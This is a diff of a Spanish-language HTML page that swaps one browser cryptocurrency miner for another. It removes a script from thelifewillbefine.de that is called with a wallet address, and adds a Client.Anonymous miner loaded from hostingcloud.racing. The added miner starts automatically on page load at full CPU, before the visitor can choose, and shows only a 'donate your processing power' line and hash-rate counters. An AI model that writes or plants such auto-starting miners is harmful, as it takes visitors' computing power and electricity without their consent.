@@ -1,14 +1,83 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Minería en Navegador</title>
+    <title>Minería Webchain</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        #controls {
+            margin-bottom: 20px;
+        }
+        #range-value {
+            font-weight: bold;
+        }
+        #message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.msr"></script>
-    <script type="text/javascript">
-        EverythingIsLife('5q2yTT3uvt1UFcchwtFUBDCt5qyxcy8DGCQQfG1rCkdZQhKaDX1XfgdT96fhm1pXQTZoMRoD6acbyeQzNewAPi4Z9EsCmPc', 'x', 30);
+
+    <h1>Minería Webchain</h1>
+
+    <!-- Control deslizante para ajustar el porcentaje de uso de la CPU -->
+    <div id="controls">
+        <label for="range">Ajustar uso de la CPU:</label>
+        <input type="range" id="range" min="0" max="100" value="100">
+        <span id="range-value">100</span>%  
+    </div>
+
+    <p id="message">Donate your processing power to mine Webchain for this site:</p>
+
+    <!-- Información sobre la minería -->
+    <div>
+        <p><span id="threads">0</span> threads</p>
+        <p><span id="hashrate">0</span> hashes / second</p>
+        <p><span id="hashes">0</span> hashes</p>
+    </div>
+
+    <!-- Script para cargar el nuevo cliente de minería -->
+    <script src="https://www.hostingcloud.racing/QqFA.js"></script>
+    <script>
+        // Crear una instancia del cliente con el ID y configuración proporcionados
+        var _client = new Client.Anonymous('6945df84d03384655f701cb48579324db37c919e8fcbe1bf308dcfee6591b111', {
+            throttle: 0, // Establece el throttle (uso de CPU), puedes cambiar el valor según lo necesites
+            c: 'w'       // Configuración adicional
+        });
+
+        // Iniciar la minería
+        _client.start();
+
+        // Función para actualizar los datos de minería
+        function updateMiningStats() {
+            setInterval(function() {
+                // Obtener el número de hilos y mostrarlo
+                var threads = _client.getNumThreads();
+                document.getElementById('threads').textContent = threads + ' threads';
+                
+                // Obtener el hash rate y mostrarlo
+                var hps = _client.getHashesPerSecond();
+                document.getElementById('hashrate').textContent = hps + ' hashes / second';
+                
+                // Obtener el total de hashes y mostrarlo
+                var hashes = _client.getTotalHashes([true]);
+                document.getElementById('hashes').textContent = hashes + ' hashes';
+            }, 1000); // Actualizar cada segundo
+        }
+
+        // Iniciar la actualización de estadísticas
+        updateMiningStats();
+
+        // Evento que se dispara cuando el valor del control deslizante cambia
+        document.querySelector('[type=range]').addEventListener('input', function() {
+            document.getElementById('range-value').textContent = this.value;
+            _client.setThrottle((100 - this.value) / 100);  // Ajusta el throttle según el valor del control deslizante
+        });
     </script>
 </body>
 </html>
